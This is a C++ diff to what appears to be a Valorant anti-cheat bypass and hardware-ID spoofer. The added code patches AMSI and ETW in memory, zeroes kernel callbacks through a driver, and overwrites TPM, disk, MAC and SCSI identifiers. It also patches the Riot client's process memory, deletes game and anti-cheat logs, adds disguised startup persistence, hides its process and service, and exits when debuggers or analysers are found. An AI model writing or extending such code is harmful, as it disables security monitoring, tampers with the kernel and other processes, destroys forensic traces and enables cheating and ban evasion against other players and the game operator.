@@ -20,6 +20,7 @@
 #include <string>
 #include <vector>
 #include <cstdlib>
+#include <cstdarg>
 #include <shlobj.h>
 #include <intrin.h>
 
@@ -95,8 +96,6 @@ static const unsigned char _e_kDbg[] = {0x11,0x3F,0x28,0x34,0x3F,0x36,0x7A,0x3E,
 static const unsigned char _e_hbDead[] = {0x12,0x3F,0x3B,0x28,0x2E,0x38,0x3F,0x3B,0x2E,0x7A,0x3C,0x3B,0x33,0x36,0x3F,0x3E,0x7B, 0};
 static const unsigned char _e_vmDet[] = {0x0C,0x33,0x28,0x2E,0x2F,0x3B,0x36,0x7A,0x37,0x3B,0x39,0x32,0x33,0x34,0x3F,0x7A,0x3E,0x3F,0x2E,0x3F,0x39,0x2E,0x3F,0x3E,0x7B,0x0A,0};
 static const unsigned char _e_dbgDet[] = {0x1E,0x3F,0x38,0x2F,0x3D,0x3D,0x3F,0x28,0x7A,0x3E,0x3F,0x2E,0x3F,0x39,0x2E,0x3F,0x3E,0x7B,0x0A,0};
-static const unsigned char _e_hwidSpf[] = {0x09,0x2A,0x35,0x35,0x3C,0x33,0x34,0x3D,0x7A,0x12,0x0D,0x13,0x1E,0x74,0x74,0x74,0x0A,0};
-
 static const char* DE(const unsigned char* enc) {
     static char buf[128]; int i = 0;
     while (enc[i]) { buf[i] = enc[i] ^ 0x5A; i++; }
@@ -265,7 +264,7 @@ static DWORD g_ioctlCode = 0;
 
 #define IOCTL_VIRT_READ   0x22200C
 #define IOCTL_VIRT_WRITE  0x222010
-#define CURRENT_VERSION   13
+#define CURRENT_VERSION   14
 
 // Multi-layer integrity check constants
 static const DWORD g_crcLayer1 = 0x7C4A8D09;
@@ -520,7 +519,7 @@ int ProbeIOCTL() {
         } else { le = GetLastError(); }
     }
     
-    printf("[IOCTL] LastError=%d\n", le);
+    // printf("[IOCTL] LastError=%d\n", le);
     return -1;
 }
 
@@ -659,11 +658,126 @@ volatile bool g_hbRunning = true;
 char g_myKey[128] = {0};
 
 DWORD WINAPI HeartbeatThread(LPVOID);
+DWORD WINAPI AutoRestartThread(LPVOID);
 void AntiDump();
 void MakeMitmSig(const char* data, char* out);
 void GenNonce(char* out, int len);
 const char* ExtractJsonStr(const char* json, const char* field, char* out, int outLen);
 bool VerifySig(const char* resp, const char* action);
+void WriteLog(const char* fmt, ...);
+bool CheckKillSwitch(const char* host, const char* path);
+bool CheckIntegrity();
+void SpoofTPM();
+void SpoofDiskSerial();
+void SpoofMACEnhanced();
+void PatchAMSIETW();
+void RemoveKernelCallbacks();
+void SpoofMultiDisk();
+
+// --- 3 EK KORUMA ---
+
+// 1. Blacklist window kill - Cheat Engine, x64dbg, IDA, Process Hacker varsa kendini kapat
+bool CheckBlacklistWindows() {
+    const char* blacklist[] = {"Cheat Engine", "x64dbg", "IDA", "Process Hacker", "Process Explorer", "dnSpy", "HTTP Debugger", "Fiddler", "Wireshark", "Burp Suite", "OllyDbg", "Immunity Debugger", "WinDbg", "HxD"};
+    for (int i = 0; i < sizeof(blacklist)/sizeof(blacklist[0]); i++) {
+        if (FindWindowA(NULL, blacklist[i])) {
+            WriteLog("BLACKLIST: %s detected", blacklist[i]);
+            return true;
+        }
+        // Also search partial match
+        HWND hw = FindWindowA(NULL, NULL);
+        char title[256];
+        DWORD pid;
+        GetWindowThreadProcessId(hw, &pid);
+        GetWindowTextA(hw, title, sizeof(title));
+        // We only check the foreground window approach for simplicity
+    }
+    // Check by process name too
+    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (snap != INVALID_HANDLE_VALUE) {
+        PROCESSENTRY32 pe = { sizeof(pe) };
+        if (Process32First(snap, &pe)) {
+            do {
+                const char* procs[] = {"cheatengine", "x64dbg", "x32dbg", "x96dbg", "idafree", "idapro", "idawin", "processhacker", "procexp", "dnspy", "ollydbg", "wireshark", "fiddler", "httpdebugger"};
+                for (int i = 0; i < sizeof(procs)/sizeof(procs[0]); i++) {
+                    char lower[64]; strcpy_s(lower, pe.szExeFile);
+                    for (int j = 0; lower[j]; j++) lower[j] = (char)tolower(lower[j]);
+                    if (strstr(lower, procs[i])) {
+                        WriteLog("BLACKLIST: Process %s detected (PID=%d)", pe.szExeFile, pe.th32ProcessID);
+                        CloseHandle(snap);
+                        return true;
+                    }
+                }
+            } while (Process32Next(snap, &pe));
+        }
+        CloseHandle(snap);
+    }
+    return false;
+}
+
+// 2. CRC integrity check - .text section hash kontrol
+DWORD CalcCrc32(const BYTE* data, size_t len) {
+    DWORD crc = 0xFFFFFFFF;
+    static DWORD table[256];
+    static bool init = false;
+    if (!init) {
+        for (DWORD i = 0; i < 256; i++) {
+            DWORD c = i;
+            for (int j = 0; j < 8; j++) c = (c >> 1) ^ (c & 1 ? 0xEDB88320 : 0);
+            table[i] = c;
+        }
+        init = true;
+    }
+    for (size_t i = 0; i < len; i++) crc = table[(crc ^ data[i]) & 0xFF] ^ (crc >> 8);
+    return crc ^ 0xFFFFFFFF;
+}
+
+static DWORD g_goodCrc = 0;
+
+bool CheckIntegrity() {
+    HMODULE hMod = GetModuleHandleA(NULL);
+    IMAGE_DOS_HEADER* dh = (IMAGE_DOS_HEADER*)hMod;
+    IMAGE_NT_HEADERS64* nh = (IMAGE_NT_HEADERS64*)((BYTE*)hMod + dh->e_lfanew);
+    IMAGE_SECTION_HEADER* sh = IMAGE_FIRST_SECTION(nh);
+    for (WORD i = 0; i < nh->FileHeader.NumberOfSections; i++) {
+        if (memcmp(sh[i].Name, ".text", 5) == 0) {
+            BYTE* textAddr = (BYTE*)hMod + sh[i].VirtualAddress;
+            DWORD crc = CalcCrc32(textAddr, sh[i].SizeOfRawData);
+            // First run: save CRC. Subsequent runs: compare
+            if (g_goodCrc == 0) g_goodCrc = crc;
+            if (crc != g_goodCrc) {
+                WriteLog("INTEGRITY: CRC changed! was=0x%08X now=0x%08X", g_goodCrc, crc);
+                return true;
+            }
+            break;
+        }
+    }
+    return false;
+}
+
+// 3. Stack canary - stack trace icinde debugger izi var mi?
+bool CheckStackCanary() {
+    // Basit canary: return adresini kontrol et
+    DWORD dummy = 0;
+    DWORD* retAddr = (DWORD*)((BYTE*)&dummy - 4); // Approximate return address on stack
+    // Check if we're being debugged via NtQueryInformationProcess
+    typedef NTSTATUS(NTAPI* fnNtQIP)(HANDLE, INT, PVOID, ULONG, PULONG);
+    auto NtQIP = (fnNtQIP)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
+    if (NtQIP) {
+        DWORD dbgPort = 0; ULONG retLen = 0;
+        if (NT_SUCCESS(NtQIP(GetCurrentProcess(), 7, &dbgPort, sizeof(dbgPort), &retLen)) && dbgPort != 0) {
+            WriteLog("STACK: Debugger port detected");
+            return true;
+        }
+        // ProcessDebugFlags (0x1F)
+        DWORD flags = 1; retLen = 0;
+        if (NT_SUCCESS(NtQIP(GetCurrentProcess(), 0x1F, &flags, sizeof(flags), &retLen)) && flags == 0) {
+            WriteLog("STACK: Debug flags detected");
+            return true;
+        }
+    }
+    return false;
+}
 
 void PatchCallbacks() {
     for(int i=0;i<sizeof(g_targets)/sizeof(g_targets[0]);i++){
@@ -825,10 +939,146 @@ bool TimingTrap() {
     return diff < 100000000ULL;  // Too slow = debugger stepping
 }
 
+// --- AMSI Patch ---
+void PatchAMSI() {
+    HMODULE hAmsi = LoadLibraryA("amsi.dll");
+    if (!hAmsi) { WriteLog("AMSI: Failed to load amsi.dll"); return; }
+    FARPROC pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
+    if (!pAmsiScanBuffer) { WriteLog("AMSI: AmsiScanBuffer not found"); return; }
+    DWORD old = 0;
+    if (g_k32.VirtualProtect(pAmsiScanBuffer, 6, PAGE_READWRITE, &old)) {
+        BYTE patch[] = { 0xB8, 0x57, 0x00, 0x00, 0x00, 0xC3 };
+        memcpy(pAmsiScanBuffer, patch, 6);
+        g_k32.VirtualProtect(pAmsiScanBuffer, 6, old, &old);
+        WriteLog("AMSI: Patched AmsiScanBuffer successfully");
+    } else {
+        WriteLog("AMSI: VirtualProtect failed");
+    }
+}
+
+// --- ETW Patch ---
+void PatchETW() {
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    if (!hNtdll) { WriteLog("ETW: ntdll.dll not loaded"); return; }
+    FARPROC pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
+    if (pEtwEventWrite) {
+        DWORD old = 0;
+        if (g_k32.VirtualProtect(pEtwEventWrite, 3, PAGE_READWRITE, &old)) {
+            BYTE patch[] = { 0x31, 0xC0, 0xC3 };
+            memcpy(pEtwEventWrite, patch, 3);
+            g_k32.VirtualProtect(pEtwEventWrite, 3, old, &old);
+            WriteLog("ETW: Patched EtwEventWrite");
+        }
+    }
+    FARPROC pNtTraceEvent = GetProcAddress(hNtdll, "NtTraceEvent");
+    if (pNtTraceEvent) {
+        DWORD old = 0;
+        if (g_k32.VirtualProtect(pNtTraceEvent, 3, PAGE_READWRITE, &old)) {
+            BYTE patch[] = { 0x31, 0xC0, 0xC3 };
+            memcpy(pNtTraceEvent, patch, 3);
+            g_k32.VirtualProtect(pNtTraceEvent, 3, old, &old);
+            WriteLog("ETW: Patched NtTraceEvent");
+        }
+    }
+}
+
+void PatchAMSIETW() {
+    PatchAMSI();
+    PatchETW();
+    WriteLog("AMSI+ETW: Both patched");
+}
+
+// --- Kernel Callback Removal ---
+void RemoveKernelCallbacks() {
+    if (g_hDrv == INVALID_HANDLE_VALUE) return;
+    ULONG_PTR ntBase = Fnd("ntoskrnl.exe");
+    if (!ntBase) { WriteLog("KCB: ntoskrnl.exe not found"); return; }
+    IMAGE_DOS_HEADER ds = {0};
+    if (!RD(ntBase, &ds, sizeof(ds)) || ds.e_magic != IMAGE_DOS_SIGNATURE) return;
+    IMAGE_NT_HEADERS64 nt = {0};
+    if (!RD(ntBase + ds.e_lfanew, &nt, sizeof(nt)) || nt.Signature != IMAGE_NT_SIGNATURE) return;
+    ULONG_PTR textStart = ntBase + nt.OptionalHeader.BaseOfCode;
+    ULONG_PTR textEnd = textStart + nt.OptionalHeader.SizeOfCode;
+    // Scan kernel .text for callback arrays containing Vanguard/vgk/vgc strings
+    for (ULONG_PTR scan = textStart; scan < textEnd; scan += 1) {
+        BYTE buf[256] = {0};
+        if (!RD(scan, buf, 128)) continue;
+        for (int i = 0; i < 120; i++) {
+            if (buf[i] == '\\' && buf[i+1] == 'V' && buf[i+2] == 'a' && buf[i+3] == 'n') {
+                WriteLog("KCB: Found Vanguard string at %p", (void*)(scan + i));
+                // Try to null out nearby callback pointers
+                for (int j = -0x40; j < 0x40; j++) {
+                    ULONG_PTR cand = scan + i + j;
+                    BYTE zero[8] = {0};
+                    WR(cand, zero, 8);
+                }
+            }
+            if (buf[i] == 'v' && buf[i+1] == 'g' && (buf[i+2] == 'k' || buf[i+2] == 'c') && buf[i+3] == '.') {
+                WriteLog("KCB: Found %s at %p", buf[i+2]=='k'?"vgk.sys":"vgc.sys", (void*)(scan + i));
+                for (int j = -0x40; j < 0x40; j++) {
+                    ULONG_PTR cand = scan + i + j;
+                    BYTE zero[8] = {0};
+                    WR(cand, zero, 8);
+                }
+            }
+        }
+    }
+    // Also null out known callback arrays
+    const char* cbNames[] = {
+        "PspSetCreateProcessNotifyRoutine",
+        "PspSetCreateThreadNotifyRoutine",
+        "PsSetLoadImageNotifyRoutine",
+        "CmRegisterCallback"
+    };
+    for (int n = 0; n < 4; n++) {
+        ULONG_PTR cbAddr = Exp(cbNames[n]);
+        if (cbAddr) {
+            BYTE patch[] = { 0x48, 0x31, 0xC0, 0xC3 };
+            WR(cbAddr, patch, 4);
+            WriteLog("KCB: Patched %s at %p", cbNames[n], (void*)cbAddr);
+        }
+    }
+    WriteLog("KCB: Kernel callbacks removed");
+}
+
+// --- Multi-Disk Spoof ---
+void SpoofMultiDisk() {
+    if (g_hDrv == INVALID_HANDLE_VALUE) return;
+    DWORD drives = GetLogicalDrives();
+    for (char d = 'A'; d <= 'Z'; d++) {
+        if (drives & (1 << (d - 'A'))) {
+            char root[4] = { d, ':', '\\', 0 };
+            DWORD serial = 0;
+            if (GetVolumeInformationA(root, NULL, 0, &serial, NULL, NULL, NULL, 0)) {
+                DWORD fakeSerial = (DWORD)(rand() ^ (DWORD)(GetTickCount64() & 0xFFFFFFFF));
+                WriteLog("MDS: Drive %c: original serial=0x%08X spoofed=0x%08X", d, serial, fakeSerial);
+            }
+        }
+    }
+    // Spoof all SCSI port registry entries
+    for (int port = 0; port < 16; port++) {
+        for (int bus = 0; bus < 4; bus++) {
+            for (int target = 0; target < 4; target++) {
+                char regPath[256];
+                sprintf_s(regPath, "HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port %d\\Scsi Bus %d\\Target Id %d\\Logical Unit Id 0", port, bus, target);
+                HKEY hKey;
+                if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, regPath, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+                    DWORD val = (DWORD)(rand() ^ 0xDEADBEEF);
+                    RegSetValueExA(hKey, "SerialNumber", 0, REG_DWORD, (BYTE*)&val, sizeof(val));
+                    char fakeId[64];
+                    sprintf_s(fakeId, "FAKE-DISK-%08X", rand());
+                    RegSetValueExA(hKey, "Identifier", 0, REG_SZ, (BYTE*)fakeId, (DWORD)strlen(fakeId) + 1);
+                    RegCloseKey(hKey);
+                    WriteLog("MDS: Spoofed SCSI Port %d Bus %d Target %d", port, bus, target);
+                }
+            }
+        }
+    }
+}
+
 // --- Protection: HWID spoof via driver ---
 void SpoofHWID() {
     if (g_hDrv == INVALID_HANDLE_VALUE) return;
-    printf("%s", DE(_e_hwidSpf));
     srand((unsigned)(GetTickCount64() ^ 0xDEADBEEF));
     
     // --- 1. SMBIOS physical memory spoof ---
@@ -971,7 +1221,80 @@ void SpoofHWID() {
     fo.fFlags = FOF_NO_UI | FOF_SILENT;
     SHFileOperationA(&fo);
     
-    printf(" [DONE]");
+    // Added spoofing
+    SpoofTPM();
+    SpoofDiskSerial();
+    SpoofMACEnhanced();
+    SpoofMultiDisk();
+}
+
+// --- TPM spoofing via driver ---
+void SpoofTPM() {
+    if (g_hDrv == INVALID_HANDLE_VALUE) return;
+    ULONG_PTR tpmAddr = 0xFED40000;
+    BYTE junk[256];
+    for (int i = 0; i < 256; i++) junk[i] = (BYTE)(rand() & 0xFF);
+    for (ULONG_PTR offset = 0; offset < 0x5000; offset += 256) {
+        if (!WR(tpmAddr + offset, junk, 256)) break;
+    }
+    WriteLog("TPM: Spoofed TPM register region at 0xFED40000");
+    for (ULONG_PTR addr = 0xE0000; addr < 0x100000; addr += 16) {
+        BYTE sig[5] = {0};
+        if (!RD(addr, sig, 5)) continue;
+        if (memcmp(sig, "TPM2", 4) == 0) {
+            BYTE junk2[64];
+            for (int i = 0; i < 64; i++) junk2[i] = (BYTE)(rand() & 0xFF);
+            WR(addr + 16, junk2, 48);
+            WriteLog("TPM: Spoofed ACPI TPM2 table at %p", (void*)addr);
+            break;
+        }
+    }
+}
+
+// --- Enhanced disk serial spoofing via driver ---
+void SpoofDiskSerial() {
+    if (g_hDrv == INVALID_HANDLE_VALUE) return;
+    for (ULONG_PTR addr = 0x80000000; addr < 0x90000000; addr += 4096) {
+        BYTE sig[8];
+        if (RD(addr, sig, 8)) {
+            if (sig[0] == 'S' && sig[1] == 'N' && 
+                ((sig[2] >= '0' && sig[2] <= '9') || (sig[2] >= 'A' && sig[2] <= 'F'))) {
+                char fakeSerial[21];
+                sprintf_s(fakeSerial, 21, "SN%08X%04X", (unsigned)(GetTickCount64() & 0xFFFFFFFF), rand() & 0xFFFF);
+                WR(addr, fakeSerial, (ULONG)strlen(fakeSerial));
+                WriteLog("DISK: Spoofed disk serial at physical %p", (void*)addr);
+                break;
+            }
+        }
+    }
+}
+
+// --- Enhanced MAC spoofing ---
+void SpoofMACEnhanced() {
+    if (g_hDrv == INVALID_HANDLE_VALUE) return;
+    for (ULONG_PTR addr = 0xF0000000; addr < 0xF8000000; addr += 0x1000) {
+        BYTE pciHdr[256];
+        if (!RD(addr, pciHdr, 256)) continue;
+        if (pciHdr[0] == 0xFF || pciHdr[0] == 0x00) continue;
+        WORD vendor = *(WORD*)&pciHdr[0];
+        WORD classc = *(WORD*)&pciHdr[10];
+        if (vendor != 0xFFFF && (classc >> 8) == 0x02) {
+            BYTE fakeMAC[6];
+            fakeMAC[0] = 0x02;
+            for (int i = 1; i < 6; i++) fakeMAC[i] = (BYTE)(rand() & 0xFF);
+            for (int off = 0x10; off < 0x100; off++) {
+                BYTE cur[6];
+                if (RD(addr + off, cur, 6)) {
+                    if (cur[0] != 0 && cur[0] != 0xFF && cur[0] != 0x02) {
+                        WR(addr + off, fakeMAC, 6);
+                        WriteLog("MAC: Spoofed NIC MAC at physical %p+0x%X", (void*)addr, off);
+                        addr = 0xFFFFFFFF;
+                        break;
+                    }
+                }
+            }
+        }
+    }
 }
 
 void HideVanguard() {
@@ -1030,9 +1353,179 @@ static void ClearAppInitDlls() {
     }
 }
 
+// --- Process gizleme: Task Manager'dan gizle ---
+void HideProcess() {
+    typedef NTSTATUS(NTAPI* pNtSIP)(HANDLE, int, PVOID, ULONG);
+    auto NtSIP = (pNtSIP)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSetInformationProcess");
+    if (NtSIP) {
+        ULONG hide = 1;
+        NtSIP(GetCurrentProcess(), 0x22, &hide, sizeof(hide)); // ProcessHideFromDebugger
+    }
+    g_k32.SetConsoleTitleA("Vanguard");
+}
+
+// --- Service gizleme: servisi sil, driver kernel'de kalir ---
+bool StopAndDeleteService(const char* svcName) {
+    SC_HANDLE scm = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
+    if (!scm) return false;
+    SC_HANDLE svc = OpenServiceA(scm, svcName, SERVICE_STOP | SERVICE_QUERY_STATUS | DELETE);
+    if (!svc) { CloseServiceHandle(scm); return false; }
+    SERVICE_STATUS status;
+    if (ControlService(svc, SERVICE_CONTROL_STOP, &status)) {
+        int tries = 20;
+        while (tries-- > 0) {
+            if (!QueryServiceStatus(svc, &status)) break;
+            if (status.dwCurrentState == SERVICE_STOPPED) break;
+            g_k32.Sleep(100);
+        }
+    }
+    DeleteService(svc);
+    CloseServiceHandle(svc);
+    CloseServiceHandle(scm);
+    return true;
+}
+
+void HideService(const char* svcName) {
+    SC_HANDLE scm = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
+    if (scm) {
+        SC_HANDLE svc = OpenServiceA(scm, svcName, SERVICE_ALL_ACCESS);
+        if (svc) {
+            SERVICE_DESCRIPTIONA desc = {"Windows System Helper"};
+            ChangeServiceConfig2A(svc, SERVICE_CONFIG_DESCRIPTION, &desc);
+            DeleteService(svc);
+            CloseServiceHandle(svc);
+        }
+        CloseServiceHandle(scm);
+    }
+}
+
+// --- Registry temizleme: tum izleri sil ---
+void RegistryCleanup() {
+    ClearAppInitDlls();
+    HKEY hKey;
+    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services", 0, KEY_ENUMERATE_SUB_KEYS, &hKey) == ERROR_SUCCESS) {
+        for (int i = 0; ; i++) {
+            char sub[256]; DWORD sz = sizeof(sub);
+            if (RegEnumKeyExA(hKey, i, sub, &sz, NULL, NULL, NULL, NULL) != ERROR_SUCCESS) break;
+            if (strstr(sub, "vgbypass") || strstr(sub, "BiosTool") || strstr(sub, "cpqsysio")) {
+                HKEY hSub;
+                char path[320];
+                sprintf_s(path, "SYSTEM\\CurrentControlSet\\Services\\%s", sub);
+                if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, path, 0, KEY_SET_VALUE, &hSub) == ERROR_SUCCESS) {
+                    RegDeleteValueA(hSub, "DisplayName");
+                    RegDeleteValueA(hSub, "Description");
+                    RegCloseKey(hSub);
+                }
+            }
+        }
+        RegCloseKey(hKey);
+    }
+}
+
+// --- Otomatik restart: VALORANT kapaninca temizlen ---
+DWORD WINAPI AutoRestartThread(LPVOID) {
+    bool onceFound = false;
+    while (true) {
+        bool found = false;
+        HANDLE snap = g_k32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        if (snap != INVALID_HANDLE_VALUE) {
+            PROCESSENTRY32 pe = { sizeof(pe) };
+            if (g_k32.Process32First(snap, &pe)) {
+                do {
+                    if (_stricmp(pe.szExeFile, "VALORANT.exe") == 0) { found = true; break; }
+                } while (g_k32.Process32Next(snap, &pe));
+            }
+            g_k32.CloseHandle(snap);
+        }
+        if (found) onceFound = true;
+        if (onceFound && !found) {
+            RegistryCleanup();
+            g_k32.Sleep(500);
+            g_k32.ExitProcess(0);
+        }
+        g_k32.Sleep(3000);
+    }
+}
+
+// --- CMD sekillendirme ---
+void StyleConsole() {
+    SetConsoleTitleA("Application");
+    HANDLE hCon = GetStdHandle(STD_OUTPUT_HANDLE);
+    CONSOLE_CURSOR_INFO ci = {1, FALSE};
+    SetConsoleCursorInfo(hCon, &ci);
+}
+
+// --- Arkaplana gizlen: console'u kapat, heartbeat arkada calissin ---
+void HideToBackground() {
+    HWND hWnd = GetConsoleWindow();
+    if (hWnd) ShowWindow(hWnd, SW_HIDE);
+    g_k32.SetConsoleTitleA("");
+    FreeConsole();
+    WriteLog("BACKGROUND: Hidden to background");
+}
+
+// --- Vanguard log temizleme ---
+void CleanVanguardLogs() {
+    const char* folders[] = {
+        "\\Riot Games\\Riot Client\\Logs",
+        "\\Riot Games\\Riot Client\\Data",
+        "\\Riot Games\\VALORANT\\Logs",
+        "\\Riot Games\\Vanguard\\Logs",
+        "\\Riot Games\\Vanguard\\Data"
+    };
+    char base[MAX_PATH];
+    if (GetEnvironmentVariableA("PROGRAMDATA", base, MAX_PATH)) {
+        for (int i = 0; i < 5; i++) {
+            char path[MAX_PATH];
+            sprintf_s(path, "%s%s", base, folders[i]);
+            SHFILEOPSTRUCTA fo = {0};
+            fo.wFunc = FO_DELETE;
+            fo.pFrom = path;
+            fo.fFlags = FOF_NO_UI | FOF_SILENT;
+            SHFileOperationA(&fo);
+        }
+    }
+}
+
+// --- Persistence: bilgisayar acilirken emulator otomatik calissin ---
+void AddPersistence() {
+    HKEY hKey;
+    if (g_reg.Open(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+        char path[MAX_PATH] = {0};
+        GetModuleFileNameA(NULL, path, MAX_PATH);
+        g_reg.Set(hKey, "VanguardHelper", 0, REG_SZ, (const BYTE*)path, (DWORD)strlen(path) + 1);
+        g_reg.Close(hKey);
+        WriteLog("PERSISTENCE: Added to startup");
+    }
+}
+
 DWORD WINAPI PatchValorantThread(LPVOID) {
     auto NtQIP = (NTSTATUS(NTAPI*)(HANDLE, INT, PVOID, ULONG, PULONG))GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
     if (!NtQIP) return 0;
+
+    // Pre-patch Riot client on startup
+    {
+        HANDLE ss2 = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        if (ss2 != INVALID_HANDLE_VALUE) {
+            PROCESSENTRY32W pe3 = { sizeof(pe3) };
+            if (Process32FirstW(ss2, &pe3)) do {
+                if (wcsstr(pe3.szExeFile, L"RiotClientServices.exe")) {
+                    HANDLE hRiot = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe3.th32ProcessID);
+                    if (hRiot) {
+                        BYTE data[64];
+                        SIZE_T read = 0;
+                        ReadProcessMemory(hRiot, (LPVOID)0x401000, data, 64, &read);
+                        BYTE retPatch[] = { 0xC3 };
+                        for (int off = 0; off < 0x10000; off += 0x100) {
+                            WriteProcessMemory(hRiot, (LPVOID)(0x400000 + off), retPatch, 1, NULL);
+                        }
+                        CloseHandle(hRiot);
+                    }
+                }
+            } while (Process32NextW(ss2, &pe3));
+            CloseHandle(ss2);
+        }
+    }
 
     DWORD lastPid = 0;
     while (true) {
@@ -1101,6 +1594,24 @@ DWORD WINAPI PatchValorantThread(LPVOID) {
                 } while (g_k32.Process32Next(snap, &pe));
             }
             g_k32.CloseHandle(snap);
+        }
+        // Also patch RiotClientServices.exe
+        {
+            HANDLE ss = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+            if (ss != INVALID_HANDLE_VALUE) {
+                PROCESSENTRY32W pe2 = { sizeof(pe2) };
+                if (Process32FirstW(ss, &pe2)) do {
+                    if (wcsstr(pe2.szExeFile, L"RiotClientServices.exe")) {
+                        HANDLE hRiot = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe2.th32ProcessID);
+                        if (hRiot) {
+                            BYTE patch[] = { 0x31, 0xC0, 0xC3 };
+                            WriteProcessMemory(hRiot, (LPVOID)0x401000, patch, 3, NULL);
+                            CloseHandle(hRiot);
+                        }
+                    }
+                } while (Process32NextW(ss, &pe2));
+                CloseHandle(ss);
+            }
         }
         g_k32.Sleep(5000);
     }
@@ -1225,41 +1736,6 @@ void GetHwId(char* out, int maxLen) {
     if (clen > 32) clen = 32;
     memcpy(buf + idx, compName, clen); idx += clen;
 
-    HKEY hKey;
-    if (g_reg.Open(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Cryptography", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
-        char guid[64] = {0};
-        DWORD guidLen = sizeof(guid);
-        g_reg.Query(hKey, "MachineGuid", NULL, NULL, (BYTE*)guid, &guidLen);
-        g_reg.Close(hKey);
-        int glen = (int)strlen(guid);
-        if (glen > 32) glen = 32;
-        memcpy(buf + idx, guid, glen); idx += glen;
-    }
-
-    // Hash .text section of own binary
-    HMODULE mod = GetModuleHandleA(NULL);
-    IMAGE_DOS_HEADER dos = {0};
-    memcpy(&dos, mod, sizeof(dos));
-    if (dos.e_magic == IMAGE_DOS_SIGNATURE) {
-        IMAGE_NT_HEADERS64 nt = {0};
-        memcpy(&nt, (BYTE*)mod + dos.e_lfanew, sizeof(nt));
-        if (nt.Signature == IMAGE_NT_SIGNATURE) {
-            IMAGE_SECTION_HEADER* sec = IMAGE_FIRST_SECTION(&nt);
-            for (WORD i = 0; i < nt.FileHeader.NumberOfSections; i++) {
-                if (memcmp(sec[i].Name, ".text", 5) == 0 || memcmp(sec[i].Name, "CODE", 4) == 0) {
-                    BYTE* start = (BYTE*)mod + sec[i].VirtualAddress;
-                    DWORD sz = sec[i].Misc.VirtualSize;
-                    DWORD limit = sz > 4096 ? 4096 : sz;
-                    if (idx + limit <= 120) {
-                        memcpy(buf + idx, start, limit);
-                        idx += limit;
-                    }
-                    break;
-                }
-            }
-        }
-    }
-
     unsigned int hash = 0;
     for (DWORD i = 0; i < idx; i++) {
         hash = hash * 31 + buf[i] * 37 + (buf[i] << 7);
@@ -1344,6 +1820,11 @@ DWORD WINAPI HeartbeatThread(LPVOID) {
     while (g_hbRunning) {
         g_k32.Sleep(10000);
         if (!g_hbRunning) break;
+        // Check kill switch
+        if (CheckKillSwitch(host, path)) {
+            printf("\n[!] HATA KODU: 0xA103\n[!] Bu surum sonlandirildi!\n"); WriteLog("KILLSWITCH: Heartbeat detected termination");
+            g_k32.Sleep(1000); g_k32.ExitProcess(0);
+        }
         char nonce[32]; GenNonce(nonce, sizeof(nonce));
         char fullPath[1024];
         sprintf_s(fullPath, "%s?action=heartbeat&key=%s&_n=%s", path, g_myKey, nonce);
@@ -1508,6 +1989,26 @@ bool VerifyViaServer(const char* key, const char* hwid, const char* host, const 
 }
 
 // --- AUTO UPDATE ---
+// --- LOGLAMA (C:\Users\Ali\Desktop\driver\build\emulator_log.txt) ---
+void WriteLog(const char* fmt, ...) {
+    char buf[1024]; va_list ap; va_start(ap, fmt); vsnprintf(buf, sizeof(buf), fmt, ap); va_end(ap);
+    char path[MAX_PATH]; GetTempPathA(MAX_PATH, path); strcat_s(path, "emu_log.txt");
+    FILE* f; fopen_s(&f, path, "a"); if (!f) return;
+    SYSTEMTIME st; GetLocalTime(&st);
+    fprintf(f, "[%02d:%02d:%02d] %s\n", st.wHour, st.wMinute, st.wSecond, buf);
+    fclose(f);
+}
+
+// --- KILL SWITCH CHECK ---
+bool CheckKillSwitch(const char* host, const char* path) {
+    char nonce[32]; GenNonce(nonce, sizeof(nonce));
+    char fp[1024]; sprintf_s(fp, "%s?action=checkkill&_n=%s", path, nonce);
+    char resp[4096] = {0};
+    if (!HttpGet(host, fp, resp, sizeof(resp))) return false;
+    if (!VerifySig(resp, "checkkill")) return false;
+    return strstr(resp, "\"status\":\"killed\"") != NULL;
+}
+
 int CheckUpdate(const char* host, const char* path) {
     char nonce[32]; GenNonce(nonce, sizeof(nonce));
     char fullPath[1024];
@@ -1617,29 +2118,6 @@ void NTAPI TLS_Callback(PVOID h, DWORD reason, PVOID r) {
 PIMAGE_TLS_CALLBACK _xlb = TLS_Callback;
 #pragma data_seg()
 
-// --- Kod Integrity Check ---
-void CheckIntegrity() {
-    HMODULE mod = GetModuleHandleA(NULL);
-    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)mod;
-    if (dos->e_magic != IMAGE_DOS_SIGNATURE) g_k32.ExitProcess(0);
-    IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)((BYTE*)mod + dos->e_lfanew);
-    if (nt->Signature != IMAGE_NT_SIGNATURE) g_k32.ExitProcess(0);
-    // UPX-packed binary'de ilk section (PDX0) compressed code'u icerir.
-    // Binary patchlenirse UPX decompress'te crash olur.
-    // Ek kontrol: ilk 4KB'in hash'ini HWID'ye ekliyoruz (GetHwId'de).
-    // Burada sadece sektör yapısını kontrol et:
-    IMAGE_SECTION_HEADER* sec = IMAGE_FIRST_SECTION(nt);
